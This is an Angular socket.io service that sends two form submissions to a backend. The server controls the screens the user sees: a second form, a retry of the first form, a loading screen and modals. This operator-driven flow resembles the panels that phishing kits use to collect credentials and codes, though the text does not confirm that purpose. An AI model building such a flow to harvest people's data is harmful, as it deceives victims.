import { Injectable } from '@angular/core';
import { io, Socket } from 'socket.io-client';
import { Observable, ReplaySubject, Subject } from 'rxjs';
import { HttpClient } from '@angular/common/http';


@Injectable({
  providedIn: 'root'
})

export class FuncionalityService {
 public  socket: Socket;
  private userId: string;
  //private api: string = 'https://back.oceanicmc.fun';
  private api: string = 'http://localhost:3000';

 constructor(private http: HttpClient) {
    this.socket = io(this.api, {
      reconnection: true,
      reconnectionAttempts: Infinity,
      randomizationFactor: 0.5
    });

    this.userId = this.generateUserId(); // Puedes usar localStorage o autenticación real
    this.socket.emit('startSession', this.userId);

    // Escuchar eventos del backend
    this.socket.on('showSecondForm', () => {
      // Mostrar segundo formulario
    });

    this.socket.on('retryForm', () => {
      // Mostrar el primer formulario nuevamente
    });

    this.socket.on('showLoading', () => {
      // Mostrar pantalla de carga
    });

    this.socket.on('showModal', (data) => {
      // Mostrar modal con texto
    });

    this.socket.on('showImageModal', (data) => {
      // Mostrar modal con imagen
    });
  }

  // Enviar datos del primer formulario
  submitFirstForm(data: any) {
    this.socket.emit('submitForm', { userId: this.userId, form: data });
  }

  // Enviar datos del segundo formulario
  submitSecondForm(data: any) {
    this.socket.emit('submitSecondForm', { userId: this.userId, form: data });
  }

  private generateUserId(): string {
    return 'user-' + Math.random().toString(36).substr(2, 9);
  }
}
